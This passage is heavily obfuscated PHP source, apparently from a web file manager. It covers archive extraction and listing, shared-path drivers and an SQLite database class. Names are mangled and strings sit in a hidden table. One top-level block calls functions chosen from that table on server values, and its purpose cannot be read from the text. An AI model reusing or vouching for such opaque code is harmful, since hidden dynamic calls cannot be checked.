KodIO::make($f´œñÛøêà[$F´¶–ÊäÍ[461]]); $còØŞªİ¾Å = parent::fileNameAuto($E˜´ç” ¤É, $f´œñÛøêà[$F´¶–ÊäÍ[28]], REPEAT_RENAME_FOLDER, !0); $FŒË ®±‹â = parent::mkdir($E˜´ç” ¤É . $còØŞªİ¾Å); $f´œñÛøêà = array($F´¶–ÊäÍ[75] => $FŒË ®±‹â); } } $FŒË ®±‹â = $f´œñÛøêà[$F´¶–ÊäÍ[75]]; goto A×Şˆ–ğÑ; C‡ÃÀ‘Óµ: Hook::trigger($F´¶–ÊäÍ[1039], $EÛÍÚ´¡ùÈ); recursion_dir($EÛÍÚ´¡ùÈ, $FŠÉù§¥ç, $cßÅÕö…Ôò, 0); $CİÀ‰…ƒÚ˜ = array_merge($FŠÉù§¥ç, $cßÅÕö…Ôò); goto d‡òéÂ¦…Ñ; d‡òéÂ¦…Ñ: foreach ($CİÀ‰…ƒÚ˜ as $eÄ¢¬½Üôß) { $eÄ¢¬½Üôß = self::iconvApp($eÄ¢¬½Üôß); self::move($eÄ¢¬½Üôß, $FŒË ®±‹â, $bˆ×è„÷¦µ); } del_dir($EÛÍÚ´¡ùÈ); if (!$aÖ×ñÖ‡ù‹) { del_file($dá§‰‹Ë§); } goto bâØö£Œ‡; bÕÃ•‘‡‚: $aù•ö§¼óŠ = KodArchive::extract($dá§‰‹Ë§, $EÛÍÚ´¡ùÈ . $F´¶–ÊäÍ[8], $eÏ™›œµ‘§); self::archiveExt(); if (!$aù•ö§¼óŠ[$F´¶–ÊäÍ[1036]]) { show_json($F´¶–ÊäÍ[1037] . $aù•ö§¼óŠ[$F´¶–ÊäÍ[1038]], !1); } goto C‡ÃÀ‘Óµ; bâØö£Œ‡: return !0; goto Bø”Œ´¤ëì; fˆñ¼£¦…: $F´¶–ÊäÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EŠßØğ­‡æ = $fîÁÆ‡Şä–[$F´¶–ÊäÍ[75]]; $FŒË ®±‹â = $fîÁÆ‡Şä–[$F´¶–ÊäÍ[1032]]; goto cãˆ¸á‰; Bø”Œ´¤ëì: } public static function unzipList($còˆï–¢¢µ) { goto FÏËËÔŸ¶³; FÏËËÔŸ¶³: $D…´°—·ŸÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c¸„«ÜÖãÉ = $còˆï–¢¢µ[$D…´°—·ŸÈ[75]]; $FÉ–ˆíù×‚ = isset($còˆï–¢¢µ[$D…´°—·ŸÈ[1040]]) ? $còˆï–¢¢µ[$D…´°—·ŸÈ[1040]] : -1; goto cÙéÇ›˜Ñä; c™¤ÁÍ¼ŒÖ: if (isset($b„æíàÃÅ¦)) { $Bİ¡Ãéç£ = array($b„æíàÃÅ¦[$D…´°—·ŸÈ[75]], $b„æíàÃÅ¦[$D…´°—·ŸÈ[1040]], $b„æíàÃÅ¦[$D…´°—·ŸÈ[28]]); $d„èˆå÷—² = md5(implode($D…´°—·ŸÈ[70], $Bİ¡Ãéç£)) . $D…´°—·ŸÈ[91] . get_path_ext($b„æíàÃÅ¦[$D…´°—·ŸÈ[28]]); } else { $Bİ¡Ãéç£ = array($B£…ˆ‘±ìò[$D…´°—·ŸÈ[28]], $B£…ˆ‘±ìò[$D…´°—·ŸÈ[75]], $B£…ˆ‘±ìò[$D…´°—·ŸÈ[77]]); $d„èˆå÷—² = md5(implode($D…´°—·ŸÈ[70], $Bİ¡Ãéç£)) . $D…´°—·ŸÈ[91] . $cÏ·‡«©¿À; } if ($FÉ–ˆíù×‚ == -1) { $a¸í§Š¬ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\x56\151\x65\167\x2f{$A‘­‡âÖßñ}\57{$d„èˆå÷—²}\x2e\x6c\157\147"; $dŸÉÂããª§ = self::infoFull($a¸í§Š¬); if ($dŸÉÂããª§) { $a¸í§Š¬ = $dŸÉÂããª§[$D…´°—·ŸÈ[75]]; $d‘†ƒÓ¡²Š = self::getContent($a¸í§Š¬); if ($d‘†ƒÓ¡²Š) { $E•šª×ˆ½› = json_decode($d‘†ƒÓ¡²Š, !0); if (count($E•šª×ˆ½›) >= $B´‚İ¬•ËÑ) { show_json(sprintf(LNG($D…´°—·ŸÈ[1042]), count($E•šª×ˆ½›)), !1); } return $E•šª×ˆ½›; } } else { $a¸í§Š¬ = self::mkfile($a¸í§Š¬); } } $BæÄÙ„‹™ = TEMP_FILES . $A‘­‡âÖßñ; goto D¡šç¬½‰í; D¡šç¬½‰í: if (!is_dir($BæÄÙ„‹™)) { mk_dir($BæÄÙ„‹™); } $Dƒ²ĞêÌ°œ = $BæÄÙ„‹™ . $D…´°—·ŸÈ[8] . $d„èˆå÷—²; if (!@file_exists(self::iconvSystem($Dƒ²ĞêÌ°œ))) { if (isset($b„æíàÃÅ¦)) { url_request($c¸„«ÜÖãÉ, $D…´°—·ŸÈ[1043], $Dƒ²ĞêÌ°œ); } else { $E å²ÍÍ£‚ = self::localFilePath($c¸„«ÜÖãÉ, $cÏ·‡«©¿À); $Dƒ²ĞêÌ°œ = $E å²ÍÍ£‚ ? $E å²ÍÍ£‚ : self::download($c¸„«ÜÖãÉ, $Dƒ²ĞêÌ°œ); } } goto A± ‘ˆÈÀÒ; dÜƒÏ†›À: return $c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1038]]; goto cóñÂØàËÙ; cÙéÇ›˜Ñä: $B´‚İ¬•ËÑ = 50000; if (request_url_safe($c¸„«ÜÖãÉ)) { $b„æíàÃÅ¦ = parse_url_query($c¸„«ÜÖãÉ); if (!isset($b„æíàÃÅ¦[$D…´°—·ŸÈ[75]])) { show_json($D…´°—·ŸÈ[1041], !1); } } $Cİ‰ãÑíÀ  = isset($b„æíàÃÅ¦) ? $b„æíàÃÅ¦[$D…´°—·ŸÈ[75]] : $c¸„«ÜÖãÉ; goto Bêº¹Ì¸; B‚êÊ“ä¼: self::archiveExt(); del_dir($BæÄÙ„‹™); if (!$c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1036]]) { show_json($c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1038]], !1); } goto E‰Ğ”ÊßÆÈ; E‰Ğ”ÊßÆÈ: $E•šª×ˆ½› = json_encode($c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1038]]); self::setContent($a¸í§Š¬, $E•šª×ˆ½›); if (count($c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1038]]) >= $B´‚İ¬•ËÑ) { show_json(sprintf(LNG($D…´°—·ŸÈ[1042]), count($c–¼‹ğ‚ÔŞ[$D…´°—·ŸÈ[1038]])), !1); } goto dÜƒÏ†›À; Bêº¹Ì¸: $B£…ˆ‘±ìò = self::info($Cİ‰ãÑíÀ ); $cÏ·‡«©¿À = self::fileExt($B£…ˆ‘±ìò); $A‘­‡âÖßñ = self::tmpFileName($B£…ˆ‘±ìò); goto c™¤ÁÍ¼ŒÖ; A± ‘ˆÈÀÒ: $Dƒ²ĞêÌ°œ = self::iconvSystem($Dƒ²ĞêÌ°œ); if ($FÉ–ˆíù×‚ >= 0) { $Cçé‡èŸø = isset($còˆï–¢¢µ[$D…´°—·ŸÈ[1044]]) ? $còˆï–¢¢µ[$D…´°—·ŸÈ[1044]] : !1; $F¸³ ŠÌ¯ç = isset($còˆï–¢¢µ[$D…´°—·ŸÈ[28]]) ? $còˆï–¢¢µ[$D…´°—·ŸÈ[28]] : $D…´°—·ŸÈ[33]; KodArchive::filePreview($Dƒ²ĞêÌ°œ, $FÉ–ˆíù×‚, $Cçé‡èŸø, $F¸³ ŠÌ¯ç); self::archiveExt(); die; } $c–¼‹ğ‚ÔŞ = KodArchive::listContent($Dƒ²ĞêÌ°œ); goto B‚êÊ“ä¼; cóñÂØàËÙ: } private static function fileExt($eà°£à³»½) { $aÜêÂ»²Üß =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eë“È¸ÅŸ = $eà°£à³»½[$aÜêÂ»²Üß[160]]; if ($eë“È¸ÅŸ == $aÜêÂ»²Üß[1045]) { $c¾‹ğª¸Ï = $aÜêÂ»²Üß[1046]; if (substr($eà°£à³»½[$aÜêÂ»²Üß[28]], -strlen($c¾‹ğª¸Ï)) == $c¾‹ğª¸Ï) { $eë“È¸ÅŸ = $aÜêÂ»²Üß[1047]; } } self::archiveExt($eë“È¸ÅŸ); return $eë“È¸ÅŸ; } private static function zipFileList($C‡‘Ùšï×, $C´áÇˆí¾Î = false) { $A²Ş¼ÅÈçÜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EŠÈÄÙŸÇ¹ = array(); foreach ($C‡‘Ùšï× as $CÇ…±‹”²Ñ) { $e©‘öˆ¢î = $CÇ…±‹”²Ñ[$A²Ş¼ÅÈçÜ[75]]; if ($C´áÇˆí¾Î) { $e©‘öˆ¢î = self::copy($CÇ…±‹”²Ñ[$A²Ş¼ÅÈçÜ[75]], $C´áÇˆí¾Î, $A²Ş¼ÅÈçÜ[748]); } if ($e©‘öˆ¢î && self::local()->exist($e©‘öˆ¢î)) { $EŠÈÄÙŸÇ¹[$CÇ…±‹”²Ñ[$A²Ş¼ÅÈçÜ[75]]] = $e©‘öˆ¢î; } } if (!empty($EŠÈÄÙŸÇ¹)) { return array_values($EŠÈÄÙŸÇ¹); } show_json(LNG($A²Ş¼ÅÈçÜ[1048]), !1); } public static function tmpFileName($CÌ©«áô¿) { $d¢²ø¯æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¦ö…ÓÅ«‘ = array($CÌ©«áô¿[$d¢²ø¯æ[28]], $CÌ©«áô¿[$d¢²ø¯æ[75]], $CÌ©«áô¿[$d¢²ø¯æ[77]], $CÌ©«áô¿[$d¢²ø¯æ[459]]); return md5(implode($d¢²ø¯æ[70], $D¦ö…ÓÅ«‘)); } private static function localFilePath($eª¥›’¦ò…, $e­Ò¼«®ÖÉ) { goto DÌôƒˆ¾†§; DÌôƒˆ¾†§: $d¼½Ç¹ŒÛ» =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($e­Ò¼«®ÖÉ == $d¼½Ç¹ŒÛ»[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $d¼½Ç¹ŒÛ»[1050]) { return !1; } $c„á„‡ôÕ = KodIO::parse($eª¥›’¦ò…); goto B©»·ÖÄ¶; A„ÄÌ˜Ö¬’: if ($dÊƒÉñŒî == $d¼½Ç¹ŒÛ»[102] || $dÊƒÉñŒî == $d¼½Ç¹ŒÛ»[1052]) { if (!$f°©êñÒ…¶->exist($f°©êñÒ…¶->path)) { show_json(LNG($d¼½Ç¹ŒÛ»[101]), !1); } return $f°©êñÒ…¶->path; } return !1; goto BÌƒñ¿„‹®; B©»·ÖÄ¶: if ($c„á„‡ôÕ[$d¼½Ç¹ŒÛ»[29]] == KodIO::KOD_SOURCE) { $d šä…Ïå = Model($d¼½Ç¹ŒÛ»[756])->fileInfoGet(KodIO::sourceID($eª¥›’¦ò…)); if (!$d šä…Ïå[$d¼½Ç¹ŒÛ»[75]]) { show_json($d¼½Ç¹ŒÛ»[1051], !1); } $eª¥›’¦ò… = $d šä…Ïå[$d¼½Ç¹ŒÛ»[75]]; } $f°©êñÒ…¶ = self::init($eª¥›’¦ò…); $dÊƒÉñŒî = $f°©êñÒ…¶->getType(); goto A„ÄÌ˜Ö¬’; BÌƒñ¿„‹®: } private static function archiveExt($B…¨İô›áÑ = '') { $GLOBALS[$_SERVER[³‘’¼äÑ™ÔÍ][1053]] = $B…¨İô›áÑ; } } goto Fì…½¹ÛìŸ; F¹Àñ°ö„Â: class PathDriverDriverShareItem { public function __construct($C™®ĞöÔò) { $this->pathParse = $C™®ĞöÔò; } public function __call($a·ƒğ¦é¾ , $FÂÍã¼­Õ) { $DáÅ‹¨ƒ‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (method_exists($this, $a·ƒğ¦é¾ )) { return; } $eñ•óˆƒ¾Ã = call_user_func_array(array($DáÅ‹¨ƒ‘[1131], $a·ƒğ¦é¾ ), $FÂÍã¼­Õ); $C¤°ß‘ë° = array($DáÅ‹¨ƒ‘[1132], $DáÅ‹¨ƒ‘[1133], $DáÅ‹¨ƒ‘[1134], $DáÅ‹¨ƒ‘[1135], $DáÅ‹¨ƒ‘[490], $DáÅ‹¨ƒ‘[492], $DáÅ‹¨ƒ‘[1136], $DáÅ‹¨ƒ‘[103], $DáÅ‹¨ƒ‘[1137], $DáÅ‹¨ƒ‘[1138]); if (in_array($a·ƒğ¦é¾ , $C¤°ß‘ë°)) { $eñ•óˆƒ¾Ã = $this->getPathOuter($eñ•óˆƒ¾Ã); } return $eñ•óˆƒ¾Ã; } public function copy($CÈàêªõ, $AïÄê†¿‰•, $DÑÛóèÉ½î = false) { return $this->copyMove($CÈàêªõ, $AïÄê†¿‰•, $DÑÛóèÉ½î, $_SERVER[³‘’¼äÑ™ÔÍ][490]); } public function move($FŸ“¸˜Æ¬È, $B˜ğÊïÅù¬, $eŠÌéêˆ¹é = false) { return $this->copyMove($FŸ“¸˜Æ¬È, $B˜ğÊïÅù¬, $eŠÌéêˆ¹é, $_SERVER[³‘’¼äÑ™ÔÍ][492]); } private function copyMove($d¦šŞ˜í²³, $AìÊÉîâ—, $B­Ÿ¿¯È¿½, $cÊ˜×©·†) { goto CÚ³­Îµäñ; CÚ³­Îµäñ: $cŸ…Åù¿Õ× =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F‰§¿îù¹· = $AìÊÉîâ—; $FŠ°ù“«•ê = IO::driverMake($AìÊÉîâ—); goto bÕ‘ßêÌ¯î; EïÕ°å°Í…: return $fÈŠïØ¥êß; goto E¦‰¿¬»²; bÕ‘ßêÌ¯î: if ($FŠ°ù“«•ê->pathParse[$cŸ…Åù¿Õ×[1002]]) { $AìÊÉîâ— = $FŠ°ù“«•ê->pathParse[$cŸ…Åù¿Õ×[1002]]; } else { $AìÊÉîâ— = $F‰§¿îù¹·; } $fÈŠïØ¥êß = IO::copyMove($d¦šŞ˜í²³, $AìÊÉîâ—, $B­Ÿ¿¯È¿½, $cÊ˜×©·†); $fÈŠïØ¥êß = $this->getPathOuter($fÈŠïØ¥êß); goto EïÕ°å°Í…; E¦‰¿¬»²: } public function pathFather($A’­ê¯‰•Õ) { return get_path_father($this->pathParse[$_SERVER[³‘’¼äÑ™ÔÍ][75]]); } public function iconvSystem($Dæõ†Ì·) { return $Dæõ†Ì·; } protected function infoParse($B±ÂÜœåª¡, $D–¸‰‰‚à = false) { $f×íÖ•‡¼… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B»ƒ„ˆÒ¶ = $this->pathParse[$f×íÖ•‡¼…[439]][$f×íÖ•‡¼…[1023]] . $this->pathParse[$f×íÖ•‡¼…[1016]]; if ($D–¸‰‰‚à) { $Fè«çøôß = IO::infoWithChildren($B»ƒ„ˆÒ¶); } else { $Fè«çøôß = IO::info($B»ƒ„ˆÒ¶); } $D¼ÅÂè†íò = $this->pathParse[$f×íÖ•‡¼…[439]]; return Action($f×íÖ•‡¼…[1128])->_shareItemeParse($Fè«çøôß, $D¼ÅÂè†íò); } public function listAll($aáµ×ÕÑ“Í) { $dÖ¥¶Ûƒé— =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A«Õ‰¼â¢ = IO::listAll($aáµ×ÕÑ“Í); $a¹©æ‰ÈÖ = $this->pathParse[$dÖ¥¶Ûƒé—[439]]; foreach ($A«Õ‰¼â¢ as &$eî°³‰ÄÜ‘) { check_abort(); $eî°³‰ÄÜ‘ = array_merge(IO::info($eî°³‰ÄÜ‘[$dÖ¥¶Ûƒé—[75]]), $eî°³‰ÄÜ‘); $eî°³‰ÄÜ‘[$dÖ¥¶Ûƒé—[391]] = Action($dÖ¥¶Ûƒé—[1128])->_shareItemeParse($eî°³‰ÄÜ‘, $a¹©æ‰ÈÖ); } return $A«Õ‰¼â¢; } public function getPathOuter($cÜ°´ù×”Ö) { goto fš†ò—·‹; D†ĞÅÑçî½: if (substr($CÒ÷å‰¿®ª, 0, strlen($b†™İ‹‡Ç›)) != $b†™İ‹‡Ç›) { return !1; } return $this->pathParse[$Fñ±ºùâ‘[1017]] . $Fñ±ºùâ‘[8] . ltrim($B¥Ğ†çò™, $Fñ±ºùâ‘[8]); goto C¤Ç†Ñ°âó; D±ÙèÛŞÂó: $CÒ÷å‰¿®ª = KodIO::clear($cÜ°´ù×”Ö); $b†™İ‹‡Ç› = KodIO::clear($this->pathParse[$Fñ±ºùâ‘[439]][$Fñ±ºùâ‘[1023]]); $B¥Ğ†çò™ = substr($CÒ÷å‰¿®ª, strlen($b†™İ‹‡Ç›)); goto D†ĞÅÑçî½; fš†ò—·‹: $Fñ±ºùâ‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eƒõïä×—§ = KodIO::parse($cÜ°´ù×”Ö); if ($eƒõïä×—§[$Fñ±ºùâ‘[29]] == KodIO::KOD_SHARE_ITEM) { return $eƒõïä×—§[$Fñ±ºùâ‘[75]]; } goto D±ÙèÛŞÂó; C¤Ç†Ñ°âó: } public function getType() { $CŒêºòÖÄ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aœÎÊÃ×¾Š = str_replace($CŒêºòÖÄ[71], $CŒêºòÖÄ[33], get_class($this)); return strtolower($aœÎÊÃ×¾Š); } public function isTypeObject($DÎŞ Ş†Åé) { return IO::isTypeObject($DÎŞ Ş†Åé); } public function info($DÕëÜî›»â) { return $this->infoParse($DÕëÜî›»â); } public function infoAuth($AÄ½Â³îÙÂ) { return $this->infoParse($AÄ½Â³îÙÂ); } public function infoWithChildren($Eœ¾Ó½äï) { return $this->infoParse($Eœ¾Ó½äï, !0); } public function infoFull($cŸÇÖçã·‚) { return $this->infoParse($cŸÇÖçã·‚); } } if ($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][791]] != $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][792]]) { goto d»ŒÑÅ‰’‡; e…–¸Ÿ‡é˜: $fš‹‹”æËÃ = explode($_SERVER[³‘’¼äÑ™ÔÍ][217], $DØ§¶Ä‚); if (count($fš‹‹”æËÃ) < $_SERVER[³‘’¼äÑ™ÔÍ][557]) { $fÀ˜»Óéãõ = $_SERVER[³‘’¼äÑ™ÔÍ][797]; $fÀ˜»Óéãõ(); } $a°·¾ÍáÂ‘ = $_SERVER[³‘’¼äÑ™ÔÍ][1129]; goto bõÌÈ¸¨…Ç; d»ŒÑÅ‰’‡: $bÌ›ØĞ×çÉ = $_SERVER[³‘’¼äÑ™ÔÍ][794]; $a‰¾«ß³ = $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]; $DØ§¶Ä‚ = $bÌ›ØĞ×çÉ($a‰¾«ß³); goto e…–¸Ÿ‡é˜; bõÌÈ¸¨…Ç: $a°·¾ÍáÂ‘($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][1130]]); goto b†ÂÆØ‹ÖØ; b†ÂÆØ‹ÖØ: } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($eôçÕâ³Š) { $this->pathParse = $eôçÕâ³Š; } protected function infoParse($E¬Ìß„İ¥Š, $CàŞãÚœÂ = false) { $E•ªÚß‚Æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return Action($E•ªÚß‚Æ[1022])->sharePathInfo($this->pathParse[$E•ªÚß‚Æ[75]], !0, $CàŞãÚœÂ); } public function listPath($BÀÁŒ¿ö¥˜, $EÏğìãÔ¨ = false) { $Bõ£‡â‘„ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E÷±¶™• = IO::listPath($BÀÁŒ¿ö¥˜, $EÏğìãÔ¨); foreach ($E÷±¶™• as $AŒ÷¥±ò²± => $FõÁ×ªÆ) { if (!in_array($AŒ÷¥±ò²±, array($Bõ£‡â‘„ˆ[73], $Bõ£‡â‘„ˆ[74]))) { continue; } foreach ($FõÁ×ªÆ as $e¾…ÖÎÓÔæ => $D·…†±†Âá) { $D·…†±†Âá = Action($Bõ£‡â‘„ˆ[1139])->parsePathChildren($D·…†±†Âá, array($Bõ£‡â‘„ˆ[387] => $BÀÁŒ¿ö¥˜)); $E÷±¶™•[$AŒ÷¥±ò²±][$e¾…ÖÎÓÔæ] = Action($Bõ£‡â‘„ˆ[1022])->shareItemInfo($D·…†±†Âá); } } return $E÷±¶™•; } public function listAll($AËÅ¤ëì°…) { $AÍ™õĞñÕ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DŒ–Õ†å¿ = IO::listAll($AËÅ¤ëì°…); foreach ($DŒ–Õ†å¿ as &$E¦Çâ‹Ÿ–ò) { $E¦Çâ‹Ÿ–ò = array_merge(IO::info($E¦Çâ‹Ÿ–ò[$AÍ™õĞñÕ[75]]), $E¦Çâ‹Ÿ–ò); $E¦Çâ‹Ÿ–ò[$AÍ™õĞñÕ[391]] = Action($AÍ™õĞñÕ[1022])->shareItemInfo($E¦Çâ‹Ÿ–ò); } return $DŒ–Õ†å¿; } } goto FÜëãçÊÊ¦; Fğº¹î†‹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto eÚ´ŒƒÅ²Î; eÚ´ŒƒÅ²Î: $C‚ «¿‘²¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $in, $config; $this->config =& $config; goto b‘ÌêÖëÓ…; aÊ†–°µÈœ: $this->tpl = TEMPLATE . MOD . $C‚ «¿‘²¢[8]; $this->_classObjectID = mt_rand(0, 10000); goto BøÌè™¸íù; b‘ÌêÖëÓ…: $this->in =& $in; $this->values[$C‚ «¿‘²¢[6]] =& $config; $this->values[$C‚ «¿‘²¢[7]] =& $in; goto aÊ†–°µÈœ; BøÌè™¸íù: } public function loadClass($D®öùî²´) { if (1 === func_num_args()) { $this->{$D®öùî²´} = new $D®öùî²´(); } else { $b¶çÒ÷Ïœ = new ReflectionClass($D®öùî²´); $EŸ´À¢Ğ›° = func_get_args(); array_shift($EŸ´À¢Ğ›°); $this->{$D®öùî²´} = $b¶çÒ÷Ïœ->newInstanceArgs($EŸ´À¢Ğ›°); } return $this->{$D®öùî²´}; } protected function assign($A‘œÁéç¿‡, $d¢¨İâ…Í) { $this->values[$A‘œÁéç¿‡] = $d¢¨İâ…Í; } protected function display($aÕéÙÊÓˆ) { ob_end_clean(); extract($this->values); require $this->tpl . $aÕéÙÊÓˆ; } } class DbSqliteBase extends Db { public function __construct($bŒ…±¨Ø  = '') { $b•ÜÈ‰®Æ‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!extension_loaded($b•ÜÈ‰®Æ‘[9])) { think_exception(think_lang($b•ÜÈ‰®Æ‘[10]) . $b•ÜÈ‰®Æ‘[11]); } if (!empty($bŒ…±¨Ø )) { if (!isset($bŒ…±¨Ø [$b•ÜÈ‰®Æ‘[12]])) { $bŒ…±¨Ø [$b•ÜÈ‰®Æ‘[12]] = 438; } $this->config = $bŒ…±¨Ø ; if (empty($this->config[$b•ÜÈ‰®Æ‘[13]])) { $this->config[$b•ÜÈ‰®Æ‘[13]] = array(); } } } public function connect($AˆëõÚßë = '', $BŒË© ŠÓ = 0) { $e‘ÒÂ«Êà =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($this->linkID[$BŒË© ŠÓ])) { goto a•²±ì”¬; A‰¸ÅÈ´˜‘: $this->linkID[$BŒË© ŠÓ] = $Fç¼åĞ‹³ì($AˆëõÚßë[$e‘ÒÂ«Êà[17]], $AˆëõÚßë[$e‘ÒÂ«Êà[12]]); if (!$this->linkID[$BŒË© ŠÓ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto AßšÁÕ¯Ü; AßšÁÕ¯Ü: @sqlite_busy_timeout($this->linkID[$BŒË© ŠÓ], 30000); if (1 != think_config($e‘ÒÂ«Êà[18])) { unset($this->config); } goto cèœØ¦××…; a•²±ì”¬: if (empty($AˆëõÚßë)) { $AˆëõÚßë = $this->config; } $B¨æãµ“É = !empty($AˆëõÚßë[$e‘ÒÂ«Êà[13]][$e‘ÒÂ«Êà[14]]) ? $AˆëõÚßë[$e‘ÒÂ«Êà[13]][$e‘ÒÂ«Êà[14]] : $this->pconnect; $Fç¼åĞ‹³ì = $B¨æãµ“É ? $e‘ÒÂ«Êà[15] : $e‘ÒÂ«Êà[16]; goto A‰¸ÅÈ´˜‘; cèœØ¦××…: } return $this->linkID[$BŒË© ŠÓ]; } public function free() { $this->queryID = null; } public function query($bÙ×¸ºŞ) { goto f¢Õƒ¡ÌÀ÷; DÈá§áø›·: $this->queryStr = $bÙ×¸ºŞ; if ($this->queryID) { $this->free(); } think_action_status($BíÛô·ÌÎÀ[19], 1); goto d·ò¼ƒî²İ; f¢Õƒ¡ÌÀ÷: $BíÛô·ÌÎÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DÈá§áø›·; fáàÆ©‚ŠØ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $bß–°Ûã” = $this->getAll(); return $bß–°Ûã”; } goto d¸ÓïÍŒ¡‹; d·ò¼ƒî²İ: think_status($BíÛô·ÌÎÀ[20]); $this->queryID = sqlite_query($this->_linkID, $bÙ×¸ºŞ); $this->debug(); goto fáàÆ©‚ŠØ; d¸ÓïÍŒ¡‹: } public function execute($B„ŞÕ‰©“Ÿ) { goto a×Œ¢› Â«; a×Œ¢› Â«: $c‚Å“ˆ…ëä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto añ®İ®­¡Ÿ; cÒÍã Ü‹: if (!1 === $E‰ŸÜ¾èÅô) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto eªİ‰ô²˜; añ®İ®­¡Ÿ: $this->queryStr = $B„ŞÕ‰©“Ÿ; if ($this->queryID) { $this->free(); } think_action_status($c‚Å“ˆ…ëä[21], 1); goto FÅêïë†‰; FÅêïë†‰: think_status($c‚Å“ˆ…ëä[20]); $E‰ŸÜ¾èÅô = sqlite_exec($this->_linkID, $B„ŞÕ‰©“Ÿ); $this->debug(); goto cÒÍã Ü‹; eªİ‰ô²˜: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[³‘’¼äÑ™ÔÍ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aç‰éç¨‰ = sqlite_query($this->_linkID, $_SERVER[³‘’¼äÑ™ÔÍ][23]); if (!$Aç‰éç¨‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dµ«ç¿ÍÄ° = sqlite_query($this->_linkID, $_SERVER[³‘’¼äÑ™ÔÍ][24]); if (!$dµ«ç¿ÍÄ°) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $C´©´ ®£è = array(); if ($this->numRows > 0) { for ($BæÃ¶çÆ™Ÿ = 0; $BæÃ¶çÆ™Ÿ < $this->numRows; $BæÃ¶çÆ™Ÿ++) { $C´©´ ®£è[$BæÃ¶çÆ™Ÿ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $C´©´ ®£è; } public function getFields($C“ÒˆÛŞÁ„) { $Cˆ÷Ü—†œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fŞÔŒÙ×Öå = $this->query($Cˆ÷Ü—†œ[25] . $C“ÒˆÛŞÁ„ . $Cˆ÷Ü—†œ[26]); $Aé‚‹¤î = array(); if ($fŞÔŒÙ×Öå) { foreach ($fŞÔŒÙ×Öå as $c£ŒÖ®†× => $fŒ¢‰ö…ßŒ) { $Aé‚‹¤î[$fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[27]]] = array($Cˆ÷Ü—†œ[28] => $fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[27]], $Cˆ÷Ü—†œ[29] => $fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[30]], $Cˆ÷Ü—†œ[31] => (bool) ($fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[32]] === $Cˆ÷Ü—†œ[33]), $Cˆ÷Ü—†œ[34] => $fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[35]], $Cˆ÷Ü—†œ[36] => strtolower($fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[37]]) == $Cˆ÷Ü—†œ[38], $Cˆ÷Ü—†œ[39] => strtolower($fŒ¢‰ö…ßŒ[$Cˆ÷Ü—†œ[40]]) == $Cˆ÷Ü—†œ[41]); } } return $Aé‚‹¤î; } public function getTables($B¨¡ˆÂÑÖ = '') { $a»„äæØÖŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c‹õ‰Œ¢Šˆ = $this->query($a»„äæØÖŒ[42] . $a»„äæØÖŒ[43] . $a»„äæØÖŒ[44]); $déÚİ¯‰¼Æ = array(); foreach ($c‹õ‰Œ¢Šˆ as $Bƒ¨Ã¾ç => $eõÌŒ°ïÒİ) { $déÚİ¯‰¼Æ[$Bƒ¨Ã¾ç] = current($eõÌŒ°ïÒİ); } return $déÚİ¯‰¼Æ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eë®Ì´ÙÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÉÂ·¨ø‘­ = sqlite_last_error($this->_linkID); $this->error = $CÉÂ·¨ø‘­ . $eë®Ì´ÙÚ[4] . sqlite_error_string($CÉÂ·¨ø‘­); 